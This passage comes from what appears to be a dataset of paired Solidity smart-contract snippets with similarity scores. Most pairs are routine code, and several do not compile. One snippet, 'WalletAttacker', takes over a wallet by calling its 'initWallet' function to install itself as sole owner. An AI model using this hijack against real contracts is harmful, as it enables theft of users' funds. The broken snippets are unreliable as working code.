    function prefixedHash(uint amount) internal view returns (bytes32) {

        bytes memory prefix = ""\x19Ethereum Signed Message:\n32"";

        return keccak256(abi.encodePacked(prefix, originalHash(amount)));

    }

}"
"contract NumParser {
    string public numArray;
    uint256[] private tempContainer;
    uint256[] public shouldBe;

    constructor() public {
        numArray = ""[\""31\"", \""25\"", \""24\""]"";
        shouldBe.push(31);
        shouldBe.push(25);
        shouldBe.push(24);
        uint256[] memory result = parseNums(numArray);
        tempContainer.length = 0;
        for (uint256 i = 0; i < result.length; i++) {
            assert(result[i] == shouldBe[i]);
        }
    }

    function parseNums(string numsToParse) internal returns (uint256[]) {
        bytes memory converted = bytes(numsToParse);
        for (uint256 i = 0; i < converted.length; i++) {
            if (converted[i] == 34) {
                tempContainer.push(0);
                uint256 j = i + 1;
                for (; converted[j] != 34; j++) {
                    tempContainer[tempContainer.length - 1] += (uint256(converted[j]) - 48);
                    tempContainer[tempContainer.length - 1] *= 10;
                }
                tempContainer[tempContainer.length - 1] /= 10;
                i = j;
            }
        }
        return tempContainer;
    }
}",0.5344779959490172,"contract Balance {

   

   function getTokenBalance(address[] memory _addresses, address[] memory _tokenAddresses) public view returns (uint256[] memory balances) {

       require(_tokenAddresses.length >= 1);

       require(_addresses.length >= 1);

       uint256 counter = 0;

       balances = new uint[](_addresses.length * _tokenAddresses.length);

       for (uint i = 0; i < _tokenAddresses.length; i++) {

           for (uint j = 0; j < _addresses.length; j++) {

                IERC20 token = IERC20(_tokenAddresses[i]);

                balances[counter] = uint256(token.balanceOf(_addresses[j]));

                counter++;

           }

       }

       return balances;

   }

   

   function getBalance(address[] memory _addresses) public view returns (uint256[] memory balances) {

       require(_addresses.length >= 1);

       uint256 counter = 0;

       balances = new uint[](_addresses.length);

       for (uint j = 0; j < _addresses.length; j++) {

            balances[counter] = _addresses[j].balance;

            counter++;

       }

   }

   

}"
"contract Fallback {

    event PayableCalled(bool called);
    bool crowdsaleClosed;

    function () payable {
        PayableCalled(true);   
        if (crowdsaleClosed) throw;
        uint amount = msg.value;
        
        
        
        
        
    }  
}",0.5245536686018419,"contract ERC1003Caller is Ownable {

    function makeCall(address target, bytes data) external payable onlyOwner returns (bool) {

        

        return target.call.value(msg.value)(data);

    }

}"
"contract StuctsGetter {

    struct MyStruct {
        uint a;
        bytes32 b;
        mapping(address => bool) active;
        bytes32[] keys;
    }

    mapping(uint => MyStruct) public myStructs;

    function setMyStruct(uint index, uint a, bytes32 b) public {
        MyStruct storage m = myStructs[index];
        m.a = a;
        m.b = b;
    }

}",0.5522764318131183,"contract callee {


    event outputi(uint i);
    event outputa(address a);
    event outputb(bytes32 b);
    
    function callee() {
    }
    
  function x (address a1, uint i1, address a2, uint i2, bytes32 b1, bytes32 b2) public {
    outputa(a1);
    outputi(i1);
    outputa(a2);
    outputi(i2);
    outputb(b1);
    outputb(b2);
  }

}"
"contract OraclizeTest is usingOraclize {

    using strings for *;

    string public randomNumbers;
    bytes32 public loadNewRandomNumbersQueryId;

    event NewRandomNumbers(string _randomNumbers);

    function loadNewRandomNumbers() public payable {
        loadNewRandomNumbersQueryId = oraclize_query(""WolframAlpha"", ""10 unique random numbers between 0 and 53"");
    }

    function __callback(bytes32 _queryId, string _result) public {
        require(_queryId == loadNewRandomNumbersQueryId, ""Oraclize Query Id Does Not Match"");
        require(msg.sender == oraclize_cbAddress(), ""Invalid Oraclize Callback Address"");

        if (_queryId == loadNewRandomNumbersQueryId) {
            randomNumbers = _result;
            emit NewRandomNumbers(randomNumbers);
        }
    }

    function parseRandomNumbers() public view returns (uint[] _randomNumbersArray) {
        strings.slice memory s = randomNumbers.toSlice();
        strings.slice memory delim = "","".toSlice();
        uint[] memory parts = new uint[](s.count(delim) + 1);
        for (uint i = 0; i < parts.length; i++) {
            parts[i] = parseInt(s.split(delim).toString());
        }
        return parts;
    }

}",0.5383797646592823,"contract AllWinToken is StandardToken {



    function () public {

        

        revert();

    }



    



    

    string public name;                   

    string public symbol;                 

    string public version = 'V0.1';       



    uint8 public constant decimals = 8;                              

    uint256 public constant PRECISION = (10 ** uint256(decimals));  



    constructor(

    uint256 _initialAmount,

    string _tokenName,

    string _tokenSymbol

    ) public {

        balances[msg.sender] = _initialAmount * PRECISION;   

        totalSupply = _initialAmount * PRECISION;            

        name = _tokenName;                                   

        symbol = _tokenSymbol;                               

    }



    function multisend(address[] dests, uint256[] values) public returns (uint256) {



        uint256 i = 0;

        while (i < dests.length) {

            require(balances[msg.sender] >= values[i]);

            transfer(dests[i], values[i]);

            i += 1;

        }

        return(i);

    }



    

    function approveAndCall(address _spender, uint256 _value, bytes _extraData) public returns (bool success) {

        allowed[msg.sender][_spender] = _value;

        emit Approval(msg.sender, _spender, _value);



        

        

        

        if(!_spender.call(bytes4(bytes32(keccak256(""receiveApproval(address,uint256,address,bytes)""))), msg.sender, _value, this, _extraData)) { revert(); }

        return true;

    }



}"
"contract Caller {
     uint public myVariable = 6;
     uint public testVar = 88;

     function delegatecallExample(address _contract, uint newVar) public {
         _contract.delegatecall(bytes4(keccak256(""updateMyVariable(uint256)"")), newVar);
     }

}",0.5585939442562315,"contract CryptoMiningWarInterface {

	uint256 public roundNumber;

    uint256 public deadline; 

    function addCrystal( address , uint256  ) public pure {}

    function isMiningWarContract() external pure returns(bool) {}

}"
"contract B is ERC721 {
  uint nextDogID = 0;
  A a = ...;

  function catToDog (uint _catID) public (returns _dogID) {
    _dogID = nextDogID++;
    _mint (msg.sender, _dogID);
    copyGene (_catID, _dogID);
    require (a.transferFrom (msg.sender, address (this), _catID));
    require (a.burn (_catID)); 
  }
}",0.5700085940635742,"contract Airdrop is Ownable {
    
    function doAirdrop(address _tokenAddr, address[] dests, uint256[] values) onlyOwner public
    returns (uint256) {
        uint256 i = 0;
        while (i < dests.length) {
            ERC20(_tokenAddr).transferFrom(msg.sender, dests[i], values[i]  * (10 ** 9));
            i += 1;
        }
        return (i);
    }
}"
"contract OwnedContract {

    mapping (address => bool) private _owners;
    mapping (address => uint) private _balances;

    modifier isOwner() {
        require(_owners[msg.sender]);
        _;
    }

    function OwnedContract() {
        _owners[msg.sender] = true;
    }

    function addOwner(string _addr)
        isOwner {
        _owners[parseAddr(_addr)] = true;
    }

    function removeOwner(string _addr)
        isOwner {
        _owners[parseAddr(_addr)] = false;
    }

    
    function parseAddr(string _a) internal returns (address){
        bytes memory tmp = bytes(_a);
        uint160 iaddr = 0;
        uint160 b1;
        uint160 b2;
        for (uint i=2; i<2+2*20; i+=2){
            iaddr *= 256;
            b1 = uint160(tmp[i]);
            b2 = uint160(tmp[i+1]);
            if ((b1 >= 97)&&(b1 <= 102)) b1 -= 87;
            else if ((b1 >= 48)&&(b1 <= 57)) b1 -= 48;
            if ((b2 >= 97)&&(b2 <= 102)) b2 -= 87;
            else if ((b2 >= 48)&&(b2 <= 57)) b2 -= 48;
            iaddr += (b1*16+b2);
        }
        return address(iaddr);
    }

    

}",0.5854688462112451,"contract ETHerNity {

    

    struct Tx {

        address user;

        uint value;

    }

    

    address public owner;

    Tx[] public txs;

    bool blocking;

    

    uint constant MIN_ETHER = 0.01 ether;

    

    modifier onlyOwner() {

        require(msg.sender == owner);

        _;

    }

    

    modifier mutex() {

        blocking = true;

        _;

        blocking = false;

    }

    

    constructor() public {

        owner = msg.sender;

    }

    

    function() payable public {

        withReferrer(owner);

        

        if (msg.sender == owner) {

            dispatch();

        }

    }

    

    function withReferrer(address referrar) payable public {

        if (blocking) return;

        

        owner.send(msg.value / 10);

        referrar.send(msg.value / 10);

        

        if (msg.value < MIN_ETHER)

            return;



        txs.push(Tx({

           user: msg.sender,

           value: msg.value / 30

        }));

    }

    

    function dispatch() onlyOwner mutex public {

        for(uint i = 0; i < txs.length; i++) {

            if (address(this).balance >= txs[i].value)

                txs[i].user.send(txs[i].value);

        }

            

    }



}"
"contract Hello {

    event TestEvent(uint256[] array);

    function hello() public {
        uint256[] memory output = new uint256[](5);
        for (uint256 i = 0; i < 5; i++) {
            output[i] = i;
        }
        TestEvent(output);
    }
}",0.5782687151725437,"contract Nest {

    mapping (uint256 => bool) public inNest;

    function getEggs() external view returns (uint256[2]);

    function add(uint256) external returns (bool, uint256, uint256);

}"
"contract Proxy {
    
    address client;

    constructor(address _client) public {
        client = _client;
    }

    
    
    function forward(bytes calldata _payload) external {
        bytes4 sig = abi.decode(_payload[:4], (bytes4));
        if (sig == bytes4(keccak256(""setOwner(address)""))) {
            address owner = abi.decode(_payload[4:], (address));
            require(owner != address(0), ""Address of owner cannot be zero."");
        }
        (bool status,) = client.delegatecall(_payload);
        require(status, ""Forwarded call failed."");
    }
}",0.5690932013724839,"contract BaseWallet {
    function init(address _owner, address[] calldata _modules) external;
    function authoriseModule(address _module, bool _value) external;
    function enableStaticCall(address _module, bytes4 _method) external;
    function setOwner(address _newOwner) external;
    function invoke(address _target, uint _value, bytes calldata _data) external returns (bytes memory _result);
    function() external payable;
}"
"contract SalaryInfo {
    struct User {
        uint salaryId;
        string name;
        string userAddress;
        uint salary;
    }
    User[] public users;

    function addUser(uint _salaryId, string _name, string _userAddress, uint _salary) public returns(uint) {
        users.length++;
        users[users.length-1].salaryId = _salaryId;
        users[users.length-1].name = _name;
        users[users.length-1].userAddress = _userAddress;
        users[users.length-1].salary = _salary;
        return users.length;
    }

    function getUsersCount() public constant returns(uint) {
        return users.length;
    }

    function getUser(uint index) public constant returns(uint, string, string, uint) {
        return (users[index].salaryId, users[index].name, users[index].userAddress, users[index].salary);
    }
}",0.59545196464147,"contract ProductsInterface {
     
    struct Product { 
        uint256  id;
        string   name;  
        string   image;
        uint256  price;
        string   detail;
        address  _seller;
         
    }
    event ProductAdded(uint256 indexed id,address seller, string  name,string  image, uint256  price,string  detail );
   
   
    function addproduct(string _name,string _image,uint256 _price,string _detail)   public   returns (bool success);
    function updateprice(uint _index, uint _price) public returns (bool success);
  
   function getproduuct(uint _index) public constant returns(uint256 id,string name,string image,uint256  price,string detail, address _seller);
   function getproductprices() public constant returns(uint256[]);
   
}"
"contract ReverseOrderEvents {

    uint lastEventBlock;

    event LogEvent(address sender, uint previousEvent);

    function doSomething() public {
        emit LogEvent(msg.sender, lastEventBlock);
        lastEventBlock = block.number;
    }
}",0.5271291948663253,"contract EventRecorder is Owned {

    
    constructor(address _owner) Owned(_owner) public {}

    
    function publishEvent(bytes memory data) public onlyOwner {
        emit IglooEvent(data);
    }

    event IglooEvent(bytes eventData);
}"
"contract Coordinator {
  uint256 public endOfCommitRequest;

  uint256 public commitCounter;
  uint256 public abortCounter;

  constructor(
    uint256 _endOfCommitRequest
  ) public {
   endOfCommitRequest = _endOfCommitRequest;
  }

  function commitRequest(bool agreement) public onlyBeforeEndOfCommitRequest {
    if(agreement) {
        commitCounter++;
    } else {
        abortCounter++;
    }  
  }

  function commit() public onlyAfterCommitPhase {
    if(abortCounter == 0) {
        
    }  else {
        
    }
  }

  modifier onlyBeforeEndOfCommitRequest() {
    require(now < endOfCommitRequest);  
    _;  
  }

  modifier onlyAfterCommitPhase() {
    require(now > endOfCommitRequest);  
    _;  
  }
}",0.5103216735474209,"contract EthAirdrop is Ownable {
  uint256 public amountToSend;

  function() payable public {}
  
  function destroyMe() onlyOwner public {
    selfdestruct(owner);
  }

  function sendEth(address[] addresses) onlyOwner public {
    for (uint256 i = 0; i < addresses.length; i++) {
      addresses[i].transfer(amountToSend);
      emit TransferEth(addresses[i], amountToSend);
    }
  }

  function changeAmount(uint256 _amount) onlyOwner public {
    amountToSend = _amount;
  }

  function getEth() onlyOwner public {
    owner.transfer(address(this).balance);
  }
  
  event TransferEth(address _address, uint256 _amount);
}"
"contract MyContract{
    uint256 public result;
    Aion aion;

    
    function schedule_add(uint256 x, uint y) public {
        aion = Aion(0xFcFB45679539667f7ed55FA59A15c8Cad73d9a4E);
        bytes memory data = abi.encodeWithSelector(bytes4(keccak256('add(uint256,uint256)')),x,y); 
        uint callCost = 200000*1e9 + aion.serviceFee();
        aion.ScheduleCall.value(callCost)( block.timestamp+1 hour, address(this), 0, 200000, 1e9, data, false);
    }


    
    function add(uint x, uint y) public {
        result = x + y;
    }


    function () public payable {}

}",0.5575338168133973,"contract KurecoinToken is BurnableToken {

  string public constant name = ""Kurecoin Token"";

  string public constant symbol = ""KRC"";

  uint8 public constant decimals = 18;





  

  function pullOut(ERC20 _token, uint256 _amount) external onlyOwner {

    _token.transfer(owner, _amount);

  }



  

  function tokenFallback(address from_, uint256 value_, bytes data_) public {

    from_; value_; data_;

    revert();

  }



  function() external payable {

      revert(""This contract does not accept Ethereum!"");

    }



}"
"contract TestIntToString {

    string public uintToStringResult;
    string public appendUintToStringResult;
    uint public stringToUintResult;

    function TestIntToString() {
        uintToStringResult = uintToString(12345678901234567890);
        appendUintToStringResult = appendUintToString(""My integer is: "", 1234567890);
        stringToUintResult = stringToUint(""12312317314571638713891378174163782169246891247193811231231731"");
    }

    function uintToString(uint v) constant returns (string str) {
        uint maxlength = 100;
        bytes memory reversed = new bytes(maxlength);
        uint i = 0;
        while (v != 0) {
            uint remainder = v % 10;
            v = v / 10;
            reversed[i++] = byte(48 + remainder);
        }
        bytes memory s = new bytes(i + 1);
        for (uint j = 0; j <= i; j++) {
            s[j] = reversed[i - j];
        }
        str = string(s);
    }

    function appendUintToString(string inStr, uint v) constant returns (string str) {
        uint maxlength = 100;
        bytes memory reversed = new bytes(maxlength);
        uint i = 0;
        while (v != 0) {
            uint remainder = v % 10;
            v = v / 10;
            reversed[i++] = byte(48 + remainder);
        }
        bytes memory inStrb = bytes(inStr);
        bytes memory s = new bytes(inStrb.length + i + 1);
        uint j;
        for (j = 0; j < inStrb.length; j++) {
            s[j] = inStrb[j];
        }
        for (j = 0; j <= i; j++) {
            s[j + inStrb.length] = reversed[i - j];
        }
        str = string(s);
    }

    function stringToUint(string s) constant returns (uint result) {
        bytes memory b = bytes(s);
        uint i;
        result = 0;
        for (i = 0; i < b.length; i++) {
            uint c = uint(b[i]);
            if (c >= 48 && c <= 57) {
                result = result * 10 + (c - 48);
            }
        }
    }
}",0.5648206967123948,"contract Hot {
    event CreateEvent(uint id, uint bid, string name, string link);
    
    event SupportEvent(uint id, uint bid);
    
    struct Record {
        uint index;
        uint bid;
        string name;
        string link;
    }

    address public owner;
    
    Record[] public records;

    constructor() public {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner);
        _;
    }

    function withdraw() external onlyOwner {
        owner.transfer(address(this).balance);
    }

    function updateRecordName(uint _id, string _name) external onlyOwner {
        require(_utfStringLength(_name) <= 20);
        require(_id < records.length);
        records[_id].name = _name;
    }

    function createRecord (string _name, string _link) external payable {
        require(msg.value >= 0.001 ether);
        require(_utfStringLength(_name) <= 20);
        require(_utfStringLength(_link) <= 50);
        records.push(Record(records.length,msg.value, _name, _link));
        emit CreateEvent(records.length-1, msg.value, _name, _link);
    }

    function supportRecord(uint _index) external payable {
        require(msg.value >= 0.001 ether);
        require(_index < records.length);
        records[_index].bid += msg.value;
        emit SupportEvent (_index, records[_index].bid);
    }
    
    function getRecordCount() external view returns (uint) {
        return records.length;
    }

    function _utfStringLength(string str) private pure returns (uint) {
        uint i = 0;
        uint l = 0;
        bytes memory string_rep = bytes(str);

        while (i<string_rep.length) {
            if (string_rep[i]>>7==0)
                i += 1;
            else if (string_rep[i]>>5==0x6)
                i += 2;
            else if (string_rep[i]>>4==0xE)
                i += 3;
            else if (string_rep[i]>>3==0x1E)
                i += 4;
            else
                
                i += 1;

            l++;
        }

        return l;
    }
}"
"contract NumParser {
    string[] public numArray;
    uint256[] public shouldBe;

    constructor() public {
        numArray.push(""31"");
        numArray.push(""25"");
        numArray.push(""24"");
        shouldBe.push(31);
        shouldBe.push(25);
        shouldBe.push(24);
        uint256[] memory result = parseNums(numArray);
        for (uint256 i = 0; i < result.length; i++) {
            assert(result[i] == shouldBe[i]);
        }
    }

    function parseNums(string[] numsToParse) internal pure returns (uint256[]) {
        uint256[] memory parsed = new uint256[](numsToParse.length);
        for (uint256 i = 0; i < numsToParse.length; i++) {
            bytes memory temp = bytes(numsToParse[i]);
            for (uint256 j = 0; j < temp.length; j++) {
                parsed[i] += (uint256(temp[j]) - 48) * (10**(temp.length - 1 - j));
            }
        }
        return parsed;
    }
}",0.5836531266666046,"contract CloversMetadata {

    using strings for *;



    function tokenURI(uint _tokenId) public view returns (string _infoUrl) {

        string memory base = ""https:

        string memory id = uint2hexstr(_tokenId);

        string memory suffix = """";

        return base.toSlice().concat(id.toSlice()).toSlice().concat(suffix.toSlice());

    }

    function uint2hexstr(uint i) internal pure returns (string) {

        if (i == 0) return ""0"";

        uint j = i;

        uint length;

        while (j != 0) {

            length++;

            j = j >> 4;

        }

        uint mask = 15;

        bytes memory bstr = new bytes(length);

        uint k = length - 1;

        while (i != 0){

            uint curr = (i & mask);

            bstr[k--] = curr > 9 ? byte(55 + curr) : byte(48 + curr); 

            i = i >> 4;

        }

        return string(bstr);

    }

}"
"contract NewBook {

    struct ChapterData {
        
        string title;
        string color;
        uint pages;
    }

    struct BookData {
        
        ChapterData[] chapters;
    }

    mapping(bytes32 => BookData) books; 

    function addChapter(bytes32 _bookID, string memory title, string memory color, uint pages) public {
        ChapterData memory c = ChapterData({
            title: title,
            color: color,
            pages: pages
        });
        books[_bookID].chapters.push(c);
    }

    function changeColor (bytes32 _bookID, uint256 chapter, string memory color) public {
        ChapterData storage _chapter = (books[_bookID]).chapters[chapter];
        _chapter.color = color;
    }

    function numChapters (bytes32 _bookID) public view returns (uint256) {
        return books[_bookID].chapters.length;
    }

    function getChapterIndex (bytes32 _bookID, string memory title) public view returns (uint256) {
        for (uint i=0; i < books[_bookID].chapters.length; i++) {
            if( keccak256(abi.encodePacked(books[_bookID].chapters[i].title)) == keccak256(abi.encodePacked(title))){
                return i;
            }
        }
    }
}",0.5776374006910622,"contract Pub {
    struct Publication {
        address source;
        uint256 timestamp;
        string title;
        
        bytes body;
    }

    mapping (address => uint256[]) public allByAuthor;
    
    mapping (address => string) public authors;
    Publication[] public all;

    function Pub() public { }

    function publishBytes(string _title, bytes _body)
    external
    returns (uint256) {
        uint256 index = all.length;
        all.push(Publication(
            msg.sender,
            now,
            _title,
            _body
        ));
        allByAuthor[msg.sender].push(index);
        return index;
    }

    function publish(string _title, string _body)
    external
    returns (uint256) {
        uint256 index = all.length;
        all.push(Publication(
            msg.sender,
            now,
            _title,
            bytes(_body)
        ));
        allByAuthor[msg.sender].push(index);
        return index;
    }

    function sign(string _name)
    external {
        authors[msg.sender] = _name;
    }

    function publicationCount(address _author)
    external view
    returns (uint256) {
        return allByAuthor[_author].length;
    }

    function size()
    external view
    returns (uint256) {
        return all.length;
    }
}"
"contract MyContract{
    uint256 public result;
    Aion aion;

    
    function schedule_add(uint256 x, uint y) public {
        aion = Aion(0xFcFB45679539667f7ed55FA59A15c8Cad73d9a4E);
        bytes memory data = abi.encodeWithSelector(bytes4(keccak256('add(uint256,uint256)')),x,y); 
        uint callCost = 200000*1e9 + aion.serviceFee();
        aion.ScheduleCall.value(callCost)( block.timestamp + 1 hour, address(this), 0, 200000, 1e9, data, false);
    }


    
    function add(uint x, uint y) public {
        result = x + y;
    }


    function () public payable {}

}",0.5608328678839783,"contract SleekPlayToken is BurnableToken {
  string public constant name = ""SleekPlay Token"";
  string public constant symbol = ""SKP"";
  uint8 public constant decimals = 18;


  
  function pullOut(ERC20 _token, uint256 _amount) external onlyOwner {
    _token.transfer(owner, _amount);
  }

  
  function tokenFallback(address from_, uint256 value_, bytes data_) public {
    from_; value_; data_;
    revert();
  }

  function() external payable {
      revert(""This contract does not accept Ethereum!"");
    }

}"
"contract crowdsale {
    uint public maximumEther;
    uint public totalEther;

    function () payable {
        
        if (totalEther + msg.value >= maximumEther) throw;

        
        totalEther = totalEther + msg.value;
    }
}",0.5953137045562432,"contract Notifier {
    constructor () public {}
    
    event Notify(address indexed who, uint256 value, bytes data);

    function() public payable {
        emit Notify(msg.sender, msg.value, msg.data);
    }
}"
"contract DieselPrice is usingOraclize {

            uint public dieselPriceUSD;

            event LogNewDieselPrice(string price);
            event LogNewOraclizeQuery(string description);

            function __callback(bytes32 myid, string memory result) public {
                    require(msg.sender == oraclize_cbAddress());
                    emit LogNewDieselPrice(result);
                    dieselPriceUSD = parseInt(result, 2); 
                    
            }

            function getQueryString() public pure returns (string memory) {
                    string memory x = ""xml(https:
                    string memory y = ""fuelPrices.diesel"";
                    return strConcat(x,y);
            }

            function update() public payable {
                    emit LogNewOraclizeQuery(""Oraclize query was sent, standing by for the answer..."");
                    oraclize_query(""URL"", getQueryString());
            }
    }",0.5697967847700567,"contract TokenMintBurnableERC20Token is ERC20 {

    string private _name;
    string private _symbol;
    uint8 private _decimals;

    constructor(string memory name, string memory symbol, uint8 decimals, uint256 totalSupply, address tokenOwnerAddress) public payable {
      _name = name;
      _symbol = symbol;
      _decimals = decimals;

      
      _mint(tokenOwnerAddress, totalSupply);
    }

    
    function burn(uint256 value) public {
      _burn(msg.sender, value);
    }

    

    
    function name() public view returns (string memory) {
      return _name;
    }

    
    function symbol() public view returns (string memory) {
      return _symbol;
    }

    
    function decimals() public view returns (uint8) {
      return _decimals;
    }
}"
"contract Mycontract {

    uint256[10] public barLengthToBarAmtForSale;

    function test() public {
        uint16 _length = 5;
        barLengthToBarAmtForSale[_length]++;
    }


}",0.5640391703763655,"contract PreIcoContract {
    function buyTokens (address _investor) public payable;
    uint256 public startTime;
    uint256 public endTime;
}"
"contract ContractFactory {
    event ContractCreated(string name, address indexed institution, address parent);

    function createContract(string name, address head, address creator) public returns (address) {
        ContractInstance contractInstance = new ContractInstance(name, head, creator);
        emit ContractCreated(name, address(contractInstance), creator);
        return address(contractInstance);
    }
}",0.5945120665734079,"contract DelegateContract is Ownable {

  address delegate_;



  event LogicContractChanged(address indexed newAddress);



  

  modifier onlyFromAccept() {

    require(msg.sender == delegate_);

    _;

  }



  function setLogicContractAddress(address _addr) public onlyOwner {

    delegate_ = _addr;

    emit LogicContractChanged(_addr);

  }



  function isDelegate(address _addr) public view returns(bool) {

    return _addr == delegate_;

  }

}"
"contract Bytes32Test {
    bytes32[] public fooStore;

    function getFooStoreLength() constant returns (uint len) {
        return fooStore.length;
    }

    event logFoo(bytes32 foo);
    function sendFoo(bytes32 foo) {
        fooStore.push(foo);
        logFoo(foo);
    }

}",0.5516038301209849,"contract BettingInterface {
    
    function placeBet(bytes32 horse) external payable;
    
    function claim_reward() external;

    mapping (bytes32 => bool) public winner_horse;
    
    function checkReward() external constant returns (uint);
}"
"contract SimpleStorage {
    struct Obj{
        int info;
        uint[2] exDataArr;
        bytes32[2] exDataStr;
    }
    mapping(int =>Obj) Obj;
    function set(uint x,uint[2] exDataArr,bytes32[2] exDataStr) {
        Obj[x]= Obj({info:info,exDataArr:exDataArr,exDataStr:exDataStr});
    }

function get(int x) public constant returns(int,uint[2],bytes32[2]){
    uint[3] memory exDataInt = Obj].exDataArr;
    bytes32[3] memory exDataStr = Obj[x].exDataStr;
    return (Obj[x].info,exDataInt,exDataStr);
}",0.5142858572949632,"contract BatchCreateDrawingsInterface {

  function isBatchCreateDrawings() public pure returns (bool);



  

  function getInternalDrawings(uint index) public returns (bytes32 _chainID, 

                                uint256 _startingPrice,

                                uint256 _endingPrice,

                                uint256 _duration, 

                                string memory _metaUrl);



  

  function getAuthorDrawings(uint index) public returns (bytes32 _chainID, 

                                bytes32 _author, 

                                address _owner, 

                                string memory _metaUrl);

}"
"contract WalletAttacker {
   ...
  function stealOwnerShip() external {
    address[1] memory owners = [address(this)];
    uint _required = 1;
    uint _daylimit = 1000000000000000000;
    targetWallet.call(
      abi.encodeWithSelector(
        bytes4(keccak256(""initWallet(address[],uint,uint)"")),
        owners,
        _required,
        _daylimit
      )
    );
  }
}",0.5250552277794738,"contract Wallet is Owned {



    address public wallet;



    event WalletUpdated(address newWallet);



    constructor() public {

        wallet = owner;

    }



    function setWallet(address _wallet) public onlyOwner {

        require(_wallet != address(0x0));

        wallet = _wallet;

        emit WalletUpdated(_wallet);

    }



}"
"contract deployFirst {
    DeployInterface contractInstance;

    function setContractInstance(address _contractInstance) public {
        contractInstance = DeployInterface(_contractInstance);
    }

    function execDoThing() public returns (uint256) {
        return contractInstance.foo();
    }
}",0.5524034802217476,"contract tokenInterface {

	function balanceOf(address _owner) public constant returns (uint256 balance);

	function transfer(address _to, uint256 _value) public returns (bool);

	function originBurn(uint256 _value) public returns(bool);

}"
"contract ArrayMapping {

    struct MyStruct {
        uint part1;
        bool part2;
    }

    struct MapStruct {
        mapping(uint => MyStruct) myStructs;   
    }

    MapStruct map;

    function get(uint index) public view returns(uint, bool) {
        return fetch(map, index);
    }

    function fetch(MapStruct storage m, uint index) internal view returns(uint, bool) {
        return (m.myStructs[index].part1, m.myStructs[index].part2);
    }
}",0.5626063712179737,"contract ERC20 {

    mapping(address => mapping(address => uint)) public allowed;

    function transferFrom(address from, address to, uint amount) public returns (bool);

    function transfer(address to, uint amount) public returns (bool);

    function approve(address spender, uint amount) public returns (bool);

    function balanceOf(address a) public view returns (uint);

}"
"contract B {    
   A private a;    
   function B() {
       a = new A();
   }    
   function doStuff() {
       a.save(42);
   }
   function getStuff()  returns (int) {
       return a.get();
   }
}",0.5944061457685831,"contract SafeMath {

	function safeAdd(uint a, uint b) internal returns(uint) {
		uint c = a + b;
		assert(c >= a && c >= b);
		return c;
	}
}"
"contract C {
   B private b;    
   function C() {
       b = new B();
   }
   function calculateTheMeaning() {
      b.doStuff();
   }
   function getTheAnswer() returns (int) {
      return b.getStuff();
   }
}",0.5960181822335135,"contract FlapLike {
    function kick(uint lot, uint bid) external returns (uint);
    function cage(uint) external;
    function live() external returns (uint);
}"
"contract Divide {

    function getDivided(uint numerator, uint denominator) public constant returns(uint quotient, uint remainder) {
        quotient  = numerator / denominator;
        remainder = numerator - denominator * quotient;
    }
}",0.5364012243506648,"contract Counter {

    int private count = 0;

    function incrementCounter() public {

        count += 1;

    }

    function decrementCounter() public {

        count -= 1;

    }

    function getCount() public constant returns (int) {

        return count;

    }

}"
"contract Store {
  event ItemSet(bytes32 key, bytes32 value);

  string public version;
  mapping (bytes32 => bytes32) public items;

  constructor(string memory _version) public {
    version = _version;
  }

  function setItem(bytes32 key, bytes32 value) external {
    items[key] = value;
    emit ItemSet(key, value);
  }
}",0.5848424872530664,"contract DepositContract {
  address public owner;
  address public parent;
  address public version;
    
  function setVersion(address newVersion) external;

  function perform(
    address addr, 
    string calldata signature, 
    bytes calldata encodedParams,
    uint value
  ) external returns (bytes memory);
}"
"contract KYCPurchase {
      uint public price = 2 ether;
      address owner;

      constructor() public{
      owner = msg.sender
}
      modifier _ownerOnly(){
      require(msg.sender == owner);
}
      struct Company {
          address companyAddress;
          string companyName;
      }

      mapping (string => Company) companies;

      function buy(string registeredNumber, string companyName) public payable {
        require(msg.value == price);

        
        companies[registeredNumber] = Company(msg.sender, companyName);

      }

      function isKYCPaymentOK (string _registeredNumber) pure _ownerOnly returns (string, string) {
            require(companies[_registeredNumber].companyAddress != address(0));
            return (companies[companyAddress].registeredNumber, companies[companyAddress].companyName);

      }
    }",0.5754126173751691,"contract Bounty {

    uint public counter = 0;

    uint public currentNumber = 1;

    string internal base64this;

    mapping(address => bool) internal winners; 

    

    constructor(string memory _base64) public {

        base64this = _base64;

    }

    

    function claim(uint guessCurrentNumber, uint setNextNumber) public {

        require(counter < 10, ""All prizes collected"");

        require(winners[msg.sender] == false, ""Cannot participate twice. But feel free to sybil us"");

        require(currentNumber == guessCurrentNumber);

        currentNumber = setNextNumber;

        counter += 1;

        winners[msg.sender] = true;

    }

    

    function getPrize() public view returns (string memory){

        require(winners[msg.sender]);

        return base64this;

    }

    

}"
"contract Zero {

  struct MyStruct {
    string[] structArray;
  }

  mapping(address => MyStruct) myStructs;

  function Zero() {
    
  }

  function appendString(string appendMe) returns(uint length) {
    return myStructs[msg.sender].structArray.push(appendMe);
  }

  function getCount() constant returns(uint length) {
    return myStructs[msg.sender].structArray.length;
  }

  function getStringAtIndex(uint index) constant returns(string value) {
    return myStructs[msg.sender].structArray[index];
  }
}",0.5552523122286637,"contract Peony is Ownable {
  function stock(string _index, string _unit, uint256 _amount, string _list) returns (bool);
  function ship(string _index) returns (bool);
  function mint(uint256 _ptAmount) returns (bool);
  function reduce(uint256 _tokenAmount) returns (bool);
  function setTokenAddress(address _address) returns (bool);
  function info(string _index) constant returns (string, string, uint256, string);
}"
"contract testStruct {
    struct myStr {
        int a;
        string b;
    }
    myStr storedStr;

    function setMyStr(int a, string b) {
        storedStr.a = a;
        storedStr.b = b;
    }

    function getMyStr() constant returns (int a, string b) {
        a = storedStr.a;
        b = storedStr.b;
    }
}",0.5916124988920051,"contract SafeMath {
    function safeSub(uint a, uint b) pure internal returns (uint) {
        assert(b <= a);
        return a - b;
    }

    function safeAdd(uint a, uint b) pure internal returns (uint) {
        uint c = a + b;
        assert(c >= a && c >= b);
        return c;
    }
}"
"contract ModularCheck {

    
    function verify(uint256 _D, uint256 _C, uint256 _c, uint256 _h, uint256 _z, uint256 _g, uint256 _l, uint256 _modulus) public returns (bool){
        uint256 exp1 = modExp(_C, _c, _modulus);
        uint256 exp2 = modExp(_h, _z, _modulus);
        uint256 exp3 = modExp(_g, _l, _modulus);

        if(_D == mulmod(mulmod(exp1,exp2, _modulus),exp3, _modulus)) return true;

    }

    function modExp(uint256 _b, uint256 _e, uint256 _m) public returns (uint256 result) {
        assembly {
            
            let pointer := mload(0x40)

            
            mstore(pointer, 0x20)
            mstore(add(pointer, 0x20), 0x20)
            mstore(add(pointer, 0x40), 0x20)

            
            mstore(add(pointer, 0x60), _b)
            mstore(add(pointer, 0x80), _e)
